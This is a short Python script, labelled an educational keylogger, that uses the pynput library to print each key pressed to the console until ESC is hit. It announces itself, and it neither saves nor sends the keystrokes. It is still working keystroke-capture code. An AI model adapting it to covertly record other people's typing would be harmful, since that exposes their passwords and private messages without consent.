from pynput import keyboard

print("🔴 Educational Keylogger Started")
print("Press ESC to stop...\n")

# When a key is pressed
def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")

# Stop when ESC is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        print("\n🛑 Keylogger Stopped")
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()